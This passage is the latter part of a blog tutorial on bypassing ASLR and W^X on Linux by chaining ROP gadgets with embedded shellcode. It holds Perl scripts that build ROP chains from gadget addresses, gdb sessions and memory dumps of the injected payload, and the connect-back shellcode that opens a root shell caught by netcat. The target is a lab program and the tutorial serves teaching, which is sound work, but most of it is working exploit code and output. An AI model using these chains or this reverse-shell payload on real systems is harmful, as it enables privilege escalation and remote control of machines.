<span class="fv">    </span><span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$add_eax_ecx</span><span class="ft">;</span><span class="fv">            </span><span class="di"># eax = @new_executable_memory + 4 + (4 x $i)</span>
<span class="fv">    </span><span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_edx</span><span class="ft">;</span><span class="fv">                </span><span class="di"># edx = $shellcode[$i]</span>
<span class="fv">    </span><span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$shellcode</span><span class="ft">[</span><span class="eq">$i</span><span class="ft">];</span>
<span class="fv">    </span><span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$mov_aeax4_edx</span><span class="ft">;</span><span class="fv">          </span><span class="di"># [@new_executable_memory + $i] = $shellcode[$i]</span>
<span class="ft">}</span>

<span class="di"># debug point</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$nop</span><span class="ft">;</span>

<span class="fk">print</span><span class="fv"> </span><span class="eq">$buffer</span><span class="ft">;</span>
</code></pre>
         </div>
         <p>
          Below, the inspection with gdb of the payload injected in the target program.
Breakpoints are set before and after the stack corruption and
the stack is next dumped.
         </p>
         <pre class="aa">
$ gdb -q StackBasedOverflow
Reading symbols from StackBasedOverflow...done.
(gdb) b *0x80488dc
<b class="ca">Breakpoint 1 at 0x80488dc</b>: file StackBasedOverflow.c, line 19.
(gdb) b *0x80488e1
<b class="ca">Breakpoint 2 at 0x80488e1</b>: file StackBasedOverflow.c, line 19.
(gdb) r "$(./rop_chain_2.pl)"
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/snake/StackBasedOverflow "$(./rop_chain_2.pl)"
[buffer:0xffffd3f0] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����J������AAAA&amp;�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����=�
                ���J�����      _����������&amp;�
����J1��BJ1�1�BJ1��BJjfX1BJ�C�RBJjjBJ���BJ�jfXBJChBJfhBJ�fSBJ��jBJQV��BJC̀�BJ�jYBJ�?̀BJIy�BJ�
                                                                                          Rh/BJ/shhBJ/binBJ��R�BJ�S��BJ��B�@CFr


Breakpoint 1, 0x080488dc in foo (str=0xffffd861 'A' &lt;repeats 200 times&gt;...) at StackBasedOverflow.c:19
19          strcpy(buffer, str);
(gdb) x/16xw $ebp
0xffffda48:     0xffffda68      <b class="ca">0x0804892b</b>      0xffffdca9      0x00000000
0xffffda58:     0x00000000      0x00000002      0x080ec550      0xffffda80
0xffffda68:     0x00000000      0x08048b4f      0x080ec504      0x00000000
0xffffda78:     0x00000000      0x08048b4f      0x00000002      0xffffdaf4
</pre>
         <p>
          Below, the dump of the corrupted stack with the payload.
On the following dump,
          <code>
           ROP CHAIN 1
          </code>
          is colored in green,
          <code>
           ROP CHAIN 2
          </code>
          in blue and the embedded shellcode is colored in red.
An extra gadget in yellow, is added at the end of the ROP chain.
This last gadget pointe to a
          <code>
           nop
          </code>
          instruction to facilitate the
debugging task.
         </p>
         <pre class="aa">
(gdb) c
Continuing.

Breakpoint 2, 0x080488e1 in foo (str=0xffffffff &lt;error: Cannot access memory at address 0xffffffff&gt;) at StackBasedOverflow.c:19
19          strcpy(buffer, str);
(gdb) x/160xw $ebp
0xffffd5f8:     0x41414141      <b class="ce">0x080481a9      0xffffffff      0x080d8b3d</b>
0xffffd608:     <b class="ce">0x080db9df      0xffffffff      0x0806ed4a      0xffffff9f</b>
0xffffd618:     <b class="ce">0x0809c5a2      0x080b9526      0xffffffdd      0x0806ed4a</b>
0xffffd628:     <b class="ce">0xffffffff      0x0809c5e3      0x0805c05f      0x08048480</b>
0xffffd638:     <b class="ce">0xffffffff      0x080483e6      0xffffffff      0x0806c09c</b>
0xffffd648:     <b class="ce">0x080b9526      0xffffffff      0x0806ed4a      0xffffff3f</b>
0xffffd658:     <b class="ce">0x0805429c      0x0806ed4a      0xffffffff      0x0805c9f7</b>
0xffffd668:     <b class="ce">0x0805c9f7      0x0805c9f7      0x0805c9f7      0x0805c9f7</b>
0xffffd678:     <b class="ce">0x0805c9f7      0x0805c9f7      0x0806f490</b><b class="cd">      0x0806ed4a</b>
0xffffd688:     <b class="cd">0x080ec540      0x0805426b      0x080db9df      0xffffffff</b>
0xffffd698:     <b class="cd">0x080d88ad      0x080d88ad      0x080d88ad      0x080d88ad</b>
0xffffd6a8:     <b class="cd">0x080d88ad      0x08063793      0x08063793      0x08063793</b>
0xffffd6b8:     <b class="cd">0x08063793      0x0806ed4a      </b><b class="ca">0xa4b0c031</b><b class="cd">      0x08053142</b>
0xffffd6c8:     <b class="cd">0x080681f0      0x0806ed4a      </b><b class="ca">0xc931db31</b><b class="cd">      0x08053142</b>
0xffffd6d8:     <b class="cd">0x080681f0      0x0806ed4a      </b><b class="ca">0x80cdd231</b><b class="cd">      0x08053142</b>
0xffffd6e8:     <b class="cd">0x080681f0      0x0806ed4a      </b><b class="ca">0x3158666a</b><b class="cd">      0x08053142</b>
0xffffd6f8:     <b class="cd">0x080681f0      0x0806ed4a      </b><b class="ca">0x529943db</b><b class="cd">      0x08053142</b>
0xffffd708:     <b class="cd">0x080681f0      0x0806ed4a      </b><b class="ca">0x026a016a</b><b class="cd">      0x08053142</b>
0xffffd718:     <b class="cd">0x080681f0      0x0806ed4a      </b><b class="ca">0x80cde189</b><b class="cd">      0x08053142</b>
0xffffd728:     <b class="cd">0x080681f0      0x0806ed4a      </b><b class="ca">0x58666a96</b><b class="cd">      0x08053142</b>
0xffffd738:     <b class="cd">0x080681f0      0x0806ed4a      </b><b class="ca">0x017f6843</b><b class="cd">      0x08053142</b>
0xffffd748:     <b class="cd">0x080681f0      0x0806ed4a      </b><b class="ca">0x68660101</b><b class="cd">      0x08053142</b>
0xffffd758:     <b class="cd">0x080681f0      0x0806ed4a      </b><b class="ca">0x5366901f</b><b class="cd">      0x08053142</b>
0xffffd768:     <b class="cd">0x080681f0      0x0806ed4a      </b><b class="ca">0x106ae189</b><b class="cd">      0x08053142</b>
0xffffd778:     <b class="cd">0x080681f0      0x0806ed4a      </b><b class="ca">0xe1895651</b><b class="cd">      0x08053142</b>
0xffffd788:     <b class="cd">0x080681f0      0x0806ed4a      </b><b class="ca">0x8780cd43</b><b class="cd">      0x08053142</b>
0xffffd798:     <b class="cd">0x080681f0      0x0806ed4a      </b><b class="ca">0x59026af3</b><b class="cd">      0x08053142</b>
0xffffd7a8:     <b class="cd">0x080681f0      0x0806ed4a      </b><b class="ca">0x80cd3fb0</b><b class="cd">      0x08053142</b>
0xffffd7b8:     <b class="cd">0x080681f0      0x0806ed4a      </b><b class="ca">0xb0f97949</b><b class="cd">      0x08053142</b>
0xffffd7c8:     <b class="cd">0x080681f0      0x0806ed4a      </b><b class="ca">0x2f68520b</b><b class="cd">      0x08053142</b>
0xffffd7d8:     <b class="cd">0x080681f0      0x0806ed4a      </b><b class="ca">0x6868732f</b><b class="cd">      0x08053142</b>
0xffffd7e8:     <b class="cd">0x080681f0      0x0806ed4a      </b><b class="ca">0x6e69622f</b><b class="cd">      0x08053142</b>
0xffffd7f8:     <b class="cd">0x080681f0      0x0806ed4a      </b><b class="ca">0x8952e389</b><b class="cd">      0x08053142</b>
0xffffd808:     <b class="cd">0x080681f0      0x0806ed4a      </b><b class="ca">0xe18953e2</b><b class="cd">      0x08053142</b>
0xffffd818:     <b class="cd">0x080681f0      0x0806ed4a      </b><b class="ca">0x909080cd</b><b class="cd">      0x08053142</b>
0xffffd828:     <b class="bz">0x08052f0f</b>      0x6b636100      0x2f676e69      0x6b726f77
0xffffd838:     0x6568732f      0x6f636c6c      0x676e6964      0x504f522f
0xffffd848:     0x2d32302f      0x2d706f72      0x68746977      0x6568732d
0xffffd858:     0x6f636c6c      0x302f6564      0x65722d33      0x69736976
0xffffd868:     0x742f6e6f      0x532f706d      0x6b636174      0x65736142
</pre>
         <p>
          Then, a breakpoint is set at
          <code>
           0x08052f0f
          </code>
          which correspond to the
following gadget
          <code>
           nop; ret
          </code>
          .
This gadget is used here only to debug the payload.
Next, the address of the new memory area is obtained by analysing the first
four byte of the
          <code>
           .data
          </code>
          section at
          <code>
           0x080ec540
          </code>
          . And a dump of the
memory is performed, where the shellcode is loaded by
          <code>
           ROP CHAIN 2
          </code>
          .
         </p>
         <pre class="aa">
(gdb) b *0x08052f0f
<b class="ca">Breakpoint 3 at 0x08052f0f</b>
(gdb) c
Continuing.

Breakpoint 3, 0x08052f0f in ?? ()
(gdb) x/xw 0x080ec540
<b class="ca">0x80ec540:      0xf7ff8000</b>
(gdb) x/32xw 0xf7ff8000
0xf7ff8000:     <b class="ca">0xa4b0c031      0xc931db31      0x80cdd231      0x3158666a</b>
0xf7ff8010:     <b class="ca">0x529943db      0x026a016a      0x80cde189      0x58666a96</b>
0xf7ff8020:     <b class="ca">0x017f6843      0x68660101      0x5366901f      0x106ae189</b>
0xf7ff8030:     <b class="ca">0xe1895651      0x8780cd43      0x59026af3      0x80cd3fb0</b>
0xf7ff8040:     <b class="ca">0xb0f97949      0x2f68520b      0x6868732f      0x6e69622f</b>
0xf7ff8050:     <b class="ca">0x8952e389      0xe18953e2      0x909080cd</b>      0x00000000
0xf7ff8060:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7ff8070:     0x00000000      0x00000000      0x00000000      0x00000000
</pre>
         <p>
          The above dump shows that the new memory area is correctly
filled with the embedded shellcode and that the the base memory address
of the new memory area is corectly saved in the
          <code>
           .data
          </code>
          section.
         </p>
         <h3 id="74-rop-chain-3-eip-redirect">
          7.4 - ROP CHAIN 3: EIP Redirect
         </h3>
         <p>
          The third part of the payload is responsible to redirect the process execution
flow to the shellcode loaded by
          <code>
           ROP CHAIN 2
          </code>
          .
It retrieves the start address of the new memory mapping saved previously in
the
          <code>
           .data
          </code>
          section and jump to this address. Then, more complex
operations are performed by the shellcode. It sets the root
UID to 0, opens a socket, starts a connection to
127.1.1.1 on the port 8080,
duplicates
          <code>
           STDERR
          </code>
          ,
          <code>
           STDIN
          </code>
          and
          <code>
           STDOUT
          </code>
          on the socket descriptor and starts a shell.
         </p>
         <p>
          Below, the selected gadgets obtained with ROPgadget are added to the
first script, used to build
          <code>
           ROP CHAIN 3
          </code>
          .
         </p>
         <pre class="bb">
0x08048f43 : xor eax, eax ; ret
0x08097246 : add eax, dword ptr [edi] ; call eax
</pre>
         <p>
          The following code is added at the end of the previous script and replace the debug line
          <code>
           $buffer .= $nop;
          </code>
          .
         </p>
         <p>
          <a href="https://github.com/VincentDary/rop-with-shellcode/blob/master/rop_chain_3.pl" style="text-decoration: none" target="_blank">
           <b>
            <em>
             rop_chain_3.pl
            </em>
           </b>
          </a>
         </p>
         <div class="a">
          <pre><span></span><code><span class="di"># gadgets section</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$xor_eax_eax</span><span class="fv"> </span><span class="fp">=</span><span class="fv">           </span><span class="fu">"\x43\x8f\x04\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x08048f43 : xor eax, eax ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$add_eax_aedi_call_eax</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="fu">"\x46\x72\x09\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x08097246 : add eax, dword ptr [edi] ; call eax</span>

<span class="di">#********************</span>
<span class="di"># shellcode caller</span>
<span class="di">#********************</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_edi</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># edi = @data</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$data_section_addr</span><span class="ft">;</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$xor_eax_eax</span><span class="ft">;</span><span class="fv">                            </span><span class="di"># eax = 0x00000000</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$add_eax_aedi_call_eax</span><span class="ft">;</span><span class="fv">                  </span><span class="di"># eax = @new_executable_memory</span>
</code></pre>
         </div>
         <p>
          Then, a hardware breakpoint is set at
          <code>
           0x08097246
          </code>
          which correspond
to the following gadget
          <code>
           add eax, dword ptr [edi] ; call eax
          </code>
          used in
          <code>
           ROP CHAIN 3
          </code>
          . This gadget redirect the execution path of
the running process to the memory area where the embedded shellcode has
been loaded by
          <code>
           ROP CHAIN 2
          </code>
          .
         </p>
         <pre class="aa">
$ gdb -q StackBasedOverflow
Reading symbols from StackBasedOverflow...done.
(gdb) b *main
Breakpoint 1 at 0x80488eb: file StackBasedOverflow.c, line 24.
(gdb)  r "$(./rop_chain_3.pl)"
Starting program: /home/snake/StackBasedOverflow "$(./rop_chain_3.pl)"

Breakpoint 1, main (argc=2, argv=0xff95bdb4) at StackBasedOverflow.c:24
(gdb) delete 1
(gdb) hb *0x08097246
<b class="ca">Hardware assisted breakpoint 2 at 0x8097246</b>
(gdb) info break
Num     Type           Disp Enb Address    What
2       hw breakpoint  keep y   0x08097246 &lt;_dl_relocate_object+3366&gt;
(gdb) c
Continuing.
[buffer:0xffa8dd80] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA????J??????AAAA&amp;?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?????=?
                ???J?????      _??????????&amp;?
????J1??BJ1?1?BJ1??BJjfX1BJ?C?RBJjjBJ???BJ?jfXBJChBJfhBJ?fSBJ??jBJQV??BJC??BJ?jYBJ???BJIy?BJ?
                                                                                          Rh//shhBJ/binBJ??R?BJ?S??BJ??B?@CFr


Breakpoint 2, 0x08097246 in _dl_relocate_object ()
(gdb) x/2i $eip
=&gt; 0x8097246 &lt;_dl_relocate_object+3366&gt;:        add    eax,DWORD PTR [edi]
   0x8097248 &lt;_dl_relocate_object+3368&gt;:        call   eax
(gdb) nexti
(gdb) i r eax
<b class="ca">eax            0xf7709000</b>       -143618048
(gdb) x/32xw $eax
0xf7709000:     <b class="ca">0xa4b0c031      0xc931db31      0x80cdd231      0x3158666a</b>
0xf7709010:     <b class="ca">0x529943db      0x026a016a      0x80cde189      0x58666a96</b>
0xf7709020:     <b class="ca">0x017f6843      0x68660101      0x5366901f      0x106ae189</b>
0xf7709030:     <b class="ca">0xe1895651      0x8780cd43      0x59026af3      0x80cd3fb0</b>
0xf7709040:     <b class="ca">0xb0f97949      0x2f68520b      0x6868732f      0x6e69622f</b>
0xf7709050:     <b class="ca">0x8952e389      0xe18953e2</b>      0x9090<b class="ca">80cd</b>      0x00000000
0xf7709060:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7709070:     0x00000000      0x00000000      0x00000000      0x00000000
</pre>
         <p>
          From an other shell, the netcat command is started in
listened mode to 127.1.1.1 on the port 80 and waits
for connection.
         </p>
         <pre class="bb">
(gdb) nexti
0xf7709000 in ?? ()
(gdb) c
Continuing.
process 12666 is executing new program: /usr/bin/bash
warning: Could not load shared library symbols for linux-vdso.so.1.
Do you need "set solib-search-path" or "set sysroot"?
</pre>
         <pre class="bb">
$ nc -v -l -p 8080 -s 127.1.1.1
Connection from 127.0.0.1:35160
whoami
snake
</pre>
         <p>
          The exploit works and a shell pop in netcat.
Trying again out of gdb shows we are root.
         </p>
         <pre class="bb">
$ ./StackBasedOverflow "$(./rop_chain_3.pl)"
[buffer:0xff8bb2f0] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����J������AAAA&amp;�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����=�
                ���J�����      _����������&amp;�
����J1��BJ1�1�BJ1��BJjfX1BJ�C�RBJjjBJ���BJ�jfXBJChBJfhBJ�fSBJ��jBJQV��BJC̀�BJ�jYBJ�?̀BJIy�BJ�
                                                                                          Rh/BJ/shhBJ/binBJ��R�BJ�S��BJ��B�@CFr
</pre>
         <pre class="bb">
$ nc -v -l -p 8080 -s 127.1.1.1
Connection from 127.0.0.1:35160
whoami
root
</pre>
         <h2 id="8-conclusion_1">
          8 - Conclusion
         </h2>
         <hr/>
         <p>
          As show here, ROP with shellcode can be used in some conditions to
bypass the ASLR and the W^X protections and to lead to an abitrary
code execution. This technique is interesting because implement an
exploit in full ROP is heavy and time consumming. Write the
three steps (memory mapping - copy code - execute code) in ROP
are easier than implement a complexe payload. Then, the injected
shellcode can performs the complexe operations and it can be not
dependent of the exploited binary instead of the part in ROP.
         </p>
         <p>
          The exploit code presented here need the precense of two key conditons very
dependent of the security set up in the system.
         </p>
         <ul>
          <li>
           1: The creation of an W+X memory region.
          </li>
          <li>
           2: The knowledge of the base addresse of an executable segment.
          </li>
         </ul>
         <p>
          The first condition is fullfilled in the major part of operating systems due
to the principal need of the JIT (just in time compilation) for the interpreted
languages. On Linux if PaX is installed and the
          <a href="https://pax.grsecurity.net/docs/mprotect.txt" style="text-decoration: none" target="_blank">
           <code>
            PAX_MPROTECT
           </code>
           flag [4]
          </a>
          activated,
this is not possible to map memory as writeable and executable.
         </p>
         <p>
          The second condition is more difficult to fullfill but it's
possible when the memory address spaces of the target process
can be disclosed. Sometimes it can be done with an another
dedicated exploit (ex: Meltdown and Spectre),
by an other vulnerability in the process which
leak its memory map (ex: Heartbleed bug),
by a bad integration of the application with the ASLR
(ex: not use of -fpic, -fPIC, -fpie, -fPIE gcc options)
or by a low entropy of the ASLR.
         </p>
         <h2 id="9-links">
          9 - Links
         </h2>
         <hr/>
         <div class="ap">
          <p>
           [1] rop-with-shellcode Github repository:
           <br/>
           <a href="https://github.com/VincentDary/rop-with-shellcode" style="text-decoration: none" target="_blank">
            https://github.com/VincentDary/rop-with-shellcode
           </a>
          </p>
          <p>
           [2] Github ROPgadget:
           <br/>
           <a href="https://github.com/JonathanSalwan/ROPgadget" style="text-decoration: none" target="_blank">
            https://github.com/JonathanSalwan/ROPgadget
           </a>
          </p>
          <p>
           [3] PaX flags:
           <br/>
           <a href="https://en.wikibooks.org/wiki/Grsecurity/Appendix/PaX_Flags" style="text-decoration: none" target="_blank">
            https://en.wikibooks.org/wiki/Grsecurity/Appendix/PaX_Flags
           </a>
          </p>
          <p>
           [4] PaX, PAX_MPROTECT (mmap and mprotect restrictions):
           <br/>
           <a href="https://pax.grsecurity.net/docs/mprotect.txt" style="text-decoration: none" target="_blank">
            https://pax.grsecurity.net/docs/mprotect.txt
           </a>
          </p>
          <p>
           [5] Hovav Shacham, Return Oriented Programming:
           <br/>
           <a href="https://www.blackhat.com/presentations/bh-usa-08/Shacham/BH_US_08_Shacham_Return_Oriented_Programming.pdf" style="text-decoration: none" target="_blank">
            https://www.blackhat.com/presentations/bh-usa-08/Shacham/BH_US_08_Shacham_Return_Oriented_Programming.pdf
           </a>
          </p>
          <p>
           [6] Meltdown and Spectre attack:
           <br/>
           <a href="https://meltdownattack.com/" style="text-decoration: none" target="_blank">
            https://meltdownattack.com/
           </a>
          </p>
          <p>
           [7] Heartbleed bug:
           <br/>
           <a href="http://heartbleed.com/" style="text-decoration: none" target="_blank">
            http://heartbleed.com/
           </a>
          </p>
          <p>
           [8] Exploit with
           <code>
            mmap
           </code>
           syscall:
           <br/>
           <a href="https://github.com/VincentDary/rop-with-shellcode/blob/master/rop_mmap.pl" style="text-decoration: none" target="_blank">
            https://github.com/VincentDary/rop-with-shellcode/blob/master/rop_mmap.pl
           </a>
          </p>
          <p>
           [9] Connect back shellcode:
           <br/>
           <a href="https://github.com/VincentDary/rop-with-shellcode/blob/master/connect_back_shellcode/connect_back_shellcode.asm" style="text-decoration: none" target="_blank">
            https://github.com/VincentDary/rop-with-shellcode/blob/master/connect_back_shellcode/connect_back_shellcode.asm
           </a>
          </p>
          <p>
           [10] W^X protection tester,  w_xor_x_test.c:
           <br/>
           <a href="https://github.com/VincentDary/rop-with-shellcode/blob/master/w_xor_x_test.c" style="text-decoration: none" target="_blank">
            https://github.com/VincentDary/rop-with-shellcode/blob/master/w_xor_x_test.c
           </a>
          </p>
         </div>
        </hr>
       </div>
       <div class="content">
        <p>
         <br/>
         <br/>
         <br/>
         <br/>
         <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">
          <img src="/static/img/by-nc-nd.eu.png" width="180"/>
         </a>
         <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">
          <img src="/static/img/by-nc-nd.png" width="180"/>
         </a>
         <br/>
         <br/>
         This article was written by Vincent Dary and is licensed under the terms of the
         <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">
          Creative Commons Attribution-NonCommercial-NoDerivs 4.0 International (CC BY-NC-ND 4.0)
         </a>
         .
         <br/>
         <br/>
         Put a mandatory link to the entire original source in case of copy or distribution.
        </p>
       </div>
      </div>
     </div>
     <div class="by" id="chunk-right">
     </div>
    </div>
   </div>
  </div>
 </body>
 <style>
  .b { justify-content: center; margin-left: 0px; }
  a { color:  blue; }
 </style>
</html>